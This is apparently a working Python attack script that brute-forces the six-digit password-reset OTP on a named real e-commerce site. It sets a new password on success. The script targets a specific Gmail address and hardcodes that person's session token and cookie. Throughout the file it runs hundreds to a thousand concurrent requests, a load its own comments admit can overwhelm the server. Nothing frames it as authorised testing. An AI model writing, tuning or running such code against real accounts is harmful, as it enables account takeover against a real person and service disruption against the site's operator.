#!/usr/bin/env python3
"""
MAXIMUM PERFORMANCE OTP Brute Force
- Up to 500+ concurrent connections
- Multiprocessing + Multithreading hybrid
- Optimized for absolute maximum speed
"""

import requests
import threading
import multiprocessing
import time
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from urllib.parse import quote
import queue
import os

PASSWORD = "qwerty_123!A"


class UltraFastOTPBrute:
    def __init__(self):
        self.success_found = multiprocessing.Event()
        self.manager = multiprocessing.Manager()
        self.found_otp = self.manager.list([None])
        self.attempt_count = self.manager.list([0])
        self.lock = multiprocessing.Lock()
    
    def sync_test_otp_batch(self, otp_batch, email, csrf_token, ga_cookie, process_id):
        """Test a batch of OTPs in one process with multiple threads"""
        local_attempts = 0
        
        def test_single_otp(otp):
            nonlocal local_attempts
            if self.success_found.is_set():
                return False, otp
            
            session = requests.Session()
            session.headers.update({
                "User-Agent": f"Mozilla/5.0 (Process-{process_id})",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest"
            })
            
            session.cookies.set('csrftoken', csrf_token)
            session.cookies.set('_ga', ga_cookie)
            
            data = {
                "step": "5",
                "otp_email": quote(email, safe='@'),
                "otpverify": otp,
                "new_password": "Aa12345!B",
                "csrfmiddlewaretoken": csrf_token
            }
            
            try:
                response = session.post(
                    "https://techshopbd.com/sign-in", 
                    data=data, 
                    timeout=2,
                    # Connection pooling for speed
                    stream=False
                )
                
                local_attempts += 1
                
                if (response.status_code == 200 and 
                    any(word in response.text.lower() for word in 
                        ["success", "dashboard", "welcome", "profile", "password changed"])):
                    
                    with self.lock:
                        if not self.found_otp[0]:
                            self.found_otp[0] = otp
                            self.success_found.set()
                    return True, otp
                    
            except:
                local_attempts += 1
                pass
            
            return False, otp
        
        # Use threading within each process for maximum concurrency
        results = []
        with ThreadPoolExecutor(max_workers=50) as executor:  # 50 threads per process
            futures = {executor.submit(test_single_otp, otp): otp for otp in otp_batch}
            
            for future in as_completed(futures):
                if self.success_found.is_set():
                    for f in futures:
                        f.cancel()
                    break
                
                try:
                    success, otp = future.result()
                    results.append((success, otp))
                    
                    if success:
                        return results
                except:
                    continue
        
        # Update global counter and print process progress
        with self.lock:
            self.attempt_count[0] += local_attempts
            if local_attempts > 0:
                print(f"🔄 Process {process_id}: Completed {local_attempts} attempts from batch")
        
        return results


async def async_test_otp(session, otp, email, csrf_token, ga_cookie):
    """Async version for even higher concurrency"""
    data = {
        "step": "5",
        "otp_email": quote(email, safe='@'),
        "otpverify": otp,
        "new_password": "Aa12345!B",
        "csrfmiddlewaretoken": csrf_token
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    cookies = {
        'csrftoken': csrf_token,
        '_ga': ga_cookie
    }
    
    try:
        async with session.post(
            "https://techshopbd.com/sign-in",
            data=data,
            headers=headers,
            cookies=cookies,
            timeout=aiohttp.ClientTimeout(total=2)
        ) as response:
            
            if response.status == 200:
                text = await response.text()
                if any(word in text.lower() for word in 
                       ["success", "dashboard", "welcome", "profile"]):
                    return True, otp
                    
    except:
        pass
    
    return False, otp


def maximum_performance_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 
                                   max_processes=None, threads_per_process=50):
    """
    MAXIMUM PERFORMANCE OTP Brute Force
    
    Args:
        start_range: Starting OTP
        end_range: Ending OTP
        email: Target email
        csrf_token: CSRF token
        ga_cookie: _ga cookie
        max_processes: Number of processes (default: CPU cores)
        threads_per_process: Threads per process (default: 50)
    
    Returns:
        Valid OTP or None
    """
    
    if max_processes is None:
        max_processes = min(multiprocessing.cpu_count(), 8)  # Limit to 8 processes max
    
    total_connections = max_processes * threads_per_process
    
    print(f"🚀 MAXIMUM PERFORMANCE OTP Brute Force")
    print(f"📧 Email: {email}")
    print(f"🎯 Range: {start_range:06d} - {end_range:06d}")
    print(f"🔥 Processes: {max_processes}")
    print(f"🧵 Threads per process: {threads_per_process}")
    print(f"⚡ Total concurrent connections: {total_connections}")
    print(f"🚀 Theoretical max rate: {total_connections * 2}/sec")
    print("-" * 60)
    
    brute_forcer = UltraFastOTPBrute()
    
    # Generate OTP list and split into batches for processes
    otp_list = [f"{i:06d}" for i in range(start_range, end_range + 1)]
    batch_size = len(otp_list) // max_processes
    otp_batches = [otp_list[i:i + batch_size] for i in range(0, len(otp_list), batch_size)]
    
    start_time = time.time()
    
    # Use ProcessPoolExecutor for maximum parallelism
    with ProcessPoolExecutor(max_workers=max_processes) as executor:
        futures = {
            executor.submit(brute_forcer.sync_test_otp_batch, batch, email, csrf_token, ga_cookie, i): i
            for i, batch in enumerate(otp_batches)
        }
        
        try:
            for future in as_completed(futures):
                if brute_forcer.success_found.is_set():
                    for f in futures:
                        f.cancel()
                    break
                
                try:
                    results = future.result()
                    
                    # Check for success
                    for success, otp in results:
                        if success:
                            elapsed = time.time() - start_time
                            print(f"🎉 SUCCESS: {otp}")
                            print(f"⏱️  Time: {elapsed:.1f}s")
                            print(f"🚀 Rate: {brute_forcer.attempt_count[0]/elapsed:.0f}/sec")
                            return otp
                    
                    # Progress update
                    elapsed = time.time() - start_time
                    if elapsed > 0 and brute_forcer.attempt_count[0] > 0:
                        rate = brute_forcer.attempt_count[0] / elapsed
                        total_otps = end_range - start_range + 1
                        progress = (brute_forcer.attempt_count[0] / total_otps) * 100
                        eta = (total_otps - brute_forcer.attempt_count[0]) / rate if rate > 0 else 0
                        print(f"⚡ Progress: {progress:.1f}% | {brute_forcer.attempt_count[0]:,}/{total_otps:,} | {rate:.0f}/sec | ETA: {eta/60:.1f}min")
                        
                except Exception as e:
                    continue
                    
        except KeyboardInterrupt:
            print("\n⏹️  Interrupted")
            for f in futures:
                f.cancel()
    
    elapsed = time.time() - start_time
    print(f"❌ No OTP found | {brute_forcer.attempt_count[0]:,} attempts | {elapsed:.1f}s")
    return None


async def async_otp_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 
                               max_concurrent=1000):
    """
    Async version for EXTREME concurrency (1000+ concurrent connections)
    
    WARNING: This can overwhelm servers! Use responsibly.
    """
    
    print(f"🌪️  ASYNC EXTREME Brute Force - {max_concurrent} concurrent connections")
    
    otp_list = [f"{i:06d}" for i in range(start_range, end_range + 1)]
    
    # Semaphore to limit concurrent connections
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def limited_test(session, otp):
        async with semaphore:
            return await async_test_otp(session, otp, email, csrf_token, ga_cookie)
    
    start_time = time.time()
    
    # Create connector with custom limits
    connector = aiohttp.TCPConnector(
        limit=max_concurrent,
        limit_per_host=max_concurrent,
        ttl_dns_cache=300,
        use_dns_cache=True,
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [limited_test(session, otp) for otp in otp_list]
        
        try:
            for i, task in enumerate(asyncio.as_completed(tasks)):
                success, otp = await task
                
                if success:
                    elapsed = time.time() - start_time
                    print(f"🎉 ASYNC SUCCESS: {otp} in {elapsed:.1f}s")
                    return otp
                
                if i % 500 == 0 and i > 0:
                    elapsed = time.time() - start_time
                    rate = i / elapsed if elapsed > 0 else 0
                    progress = (i / len(otp_list)) * 100
                    eta = (len(otp_list) - i) / rate if rate > 0 else 0
                    print(f"🌪️  Async Progress: {progress:.1f}% | {i:,}/{len(otp_list):,} | {rate:.0f}/sec | ETA: {eta/60:.1f}min")
                    
        except KeyboardInterrupt:
            print("\n⏹️  Interrupted")
    
    return None


def intelligent_fast_brute_force(start_range, end_range, email, csrf_token, ga_cookie):
    """
    Intelligent brute force that automatically scales based on system resources
    """
    
    # Detect system capabilities
    cpu_count = multiprocessing.cpu_count()
    
    if end_range - start_range < 10000:
        # Small range - use high-thread single process
        print("🎯 Small range detected - using high-concurrency threading")
        return ultra_threading_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 200)
    
    elif cpu_count >= 8:
        # Multi-core system - use multiprocessing
        print("💪 Multi-core system - using multiprocessing")
        return maximum_performance_brute_force(start_range, end_range, email, csrf_token, ga_cookie)
    
    else:
        # Lower-end system - use async
        print("🌐 Using async high-concurrency approach")
        return asyncio.run(async_otp_brute_force(start_range, end_range, email, csrf_token, ga_cookie, 500))


def ultra_threading_brute_force(start_range, end_range, email, csrf_token, ga_cookie, max_threads=200):
    """
    Ultra-high threading version (up to 500+ threads)
    """
    
    print(f"🧵 ULTRA-THREADING: {max_threads} concurrent threads")
    
    success_event = threading.Event()
    found_otp = [None]
    attempt_count = [0]
    lock = threading.Lock()
    
    def test_otp(otp):
        if success_event.is_set():
            return False
        
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Ultra-Thread)",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        })
        
        session.cookies.set('csrftoken', csrf_token)
        session.cookies.set('_ga', ga_cookie)
        
        data = {
            "step": "5",
            "otp_email": quote(email, safe='@'),
            "otpverify": otp,
            "new_password": PASSWORD,
            "csrfmiddlewaretoken": csrf_token
        }
        
        try:
            response = session.post("https://techshopbd.com/sign-in", data=data, timeout=1)
            
            with lock:
                attempt_count[0] += 1
            
            if (response.status_code == 200 and 
                any(word in response.text.lower() for word in ["success", "dashboard"])):
                
                with lock:
                    if not found_otp[0]:
                        found_otp[0] = otp
                        success_event.set()
                return True
        except:
            with lock:
                attempt_count[0] += 1
        
        return False
    
    otp_list = [f"{i:06d}" for i in range(start_range, end_range + 1)]
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(test_otp, otp): otp for otp in otp_list}
        
        for future in as_completed(futures):
            if success_event.is_set():
                for f in futures:
                    f.cancel()
                break
            
            if attempt_count[0] % 500 == 0 and attempt_count[0] > 0:
                elapsed = time.time() - start_time
                rate = attempt_count[0] / elapsed if elapsed > 0 else 0
                progress = (attempt_count[0] / len(otp_list)) * 100 if len(otp_list) > 0 else 0
                print(f"⚡ Progress: {progress:.1f}% | {attempt_count[0]:,}/{len(otp_list):,} attempts | {rate:.0f} OTPs/sec | {elapsed:.1f}s elapsed")
    
    if found_otp[0]:
        elapsed = time.time() - start_time
        print(f"🎉 SUCCESS: {found_otp[0]} | {elapsed:.1f}s | {attempt_count[0]/elapsed:.0f}/sec")
        return found_otp[0]
    
    return None


# USAGE EXAMPLES WITH EXECUTION TIME TRACKING
if __name__ == "__main__":
    email = "ariel.agra.archive@gmail.com"
    csrf_token = "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6"
    ga_cookie = "GA1.1.891817179.1758869982"

    START_RANGE = 635000
    END_RANGE = 640000

    print("🚀 MAXIMUM PERFORMANCE OTP Brute Force Testing")
    print("=" * 60)
    print("📧 Target:", email)
    print("START RANGE:", START_RANGE)
    print("END RANGE:", END_RANGE)
    # print("🎯 Available approaches:")
    # print("1. Ultra-threading (200+ threads)")
    # print("2. Multiprocessing + Threading hybrid")
    # print("3. Async extreme concurrency (1000+ connections)")
    # print("4. Intelligent auto-scaling")
    print("=" * 60)
    
    # Test different approaches with execution time tracking
    
    # # Example 1: Ultra-threading with detailed timing
    print("\n🧵 Testing Ultra-Threading Approach (300 threads)")
    print("-" * 50)
    overall_start = time.time()

    result = ultra_threading_brute_force(
        start_range=START_RANGE,
        end_range=END_RANGE,  # Test 2000 OTPs for demo
        email=email,
        csrf_token=csrf_token,
        ga_cookie=ga_cookie,
        max_threads=300
    )

    overall_elapsed = time.time() - overall_start
    print(f"\n📊 ULTRA-THREADING RESULTS:")
    print(f"⏱️  Total Execution Time: {overall_elapsed:.2f} seconds ({overall_elapsed/60:.2f} minutes)")
    print(f"🎯 Result: {'✅ SUCCESS - ' + result if result else '❌ No OTP found'}")
    print(f"🚀 Overall Performance: {(END_RANGE - START_RANGE)/overall_elapsed:.1f} OTPs/second")
    #
    # # Example 2: Multiprocessing approach
    # print("\n🔀 Testing Multiprocessing + Threading Hybrid")
    # print("-" * 50)
    # hybrid_start = time.time()
    #
    # result2 = maximum_performance_brute_force(
    #     start_range=435000,
    #     end_range=441000,  # Test another 2000 OTPs
    #     email=email,
    #     csrf_token=csrf_token,
    #     ga_cookie=ga_cookie,
    #     max_processes=4,
    #     threads_per_process=50
    # )
    #
    # hybrid_elapsed = time.time() - hybrid_start
    # print(f"\n📊 HYBRID MULTIPROCESSING RESULTS:")
    # print(f"⏱️  Total Execution Time: {hybrid_elapsed:.2f} seconds ({hybrid_elapsed/60:.2f} minutes)")
    # print(f"🎯 Result: {'✅ SUCCESS - ' + result2 if result2 else '❌ No OTP found'}")
    # print(f"🚀 Overall Performance: {2000/hybrid_elapsed:.1f} OTPs/second")
    #
    # # Example 3: Async approach (commented out to avoid overwhelming)
    # print("\n🌪️  Async Extreme Concurrency (Ready to test)")
    # print("-" * 50)
    # print("⚠️  Async mode ready but commented out to prevent server overload")
    # print("💡 Uncomment the code below to test 1000+ concurrent connections")
    
    # Uncomment for async testing (WARNING: Very high server load!)
    # async_start = time.time()
    # result3 = asyncio.run(async_otp_brute_force(
    #     start_range=104001,
    #     end_range=105000,
    #     email=email,
    #     csrf_token=csrf_token,
    #     ga_cookie=ga_cookie,
    #     max_concurrent=500  # Start with 500, can go up to 1000+
    # ))
    # async_elapsed = time.time() - async_start
    # print(f"\n📊 ASYNC RESULTS:")
    # print(f"⏱️  Total Execution Time: {async_elapsed:.2f} seconds")
    # print(f"🎯 Result: {'✅ SUCCESS - ' + result3 if result3 else '❌ No OTP found'}")
    
    # Summary
    # total_program_time = time.time() - overall_start
    # print(f"\n" + "=" * 60)
    # print(f"📈 PERFORMANCE SUMMARY")
    # print(f"⏱️  Total Program Runtime: {total_program_time:.2f} seconds ({total_program_time/60:.2f} minutes)")
    # print(f"🧵 Ultra-threading: {overall_elapsed:.2f}s ({2000/overall_elapsed:.1f} OTPs/sec)")
    # print(f"🔀 Hybrid approach: {hybrid_elapsed:.2f}s ({2000/hybrid_elapsed:.1f} OTPs/sec)")
    #
    # if result or result2:
    #     print(f"\n🎉 SUCCESS! Found OTP(s):")
    #     if result:
    #         print(f"   ✅ Ultra-threading found: {result}")
    #     if result2:
    #         print(f"   ✅ Hybrid approach found: {result2}")
    # else:
    #     print(f"\n❌ No valid OTPs found in tested ranges")
    #     print(f"💡 Try expanding the search range or checking credentials")
    #
    # print(f"\n🔚 Program completed at {time.strftime('%Y-%m-%d %H:%M:%S')}")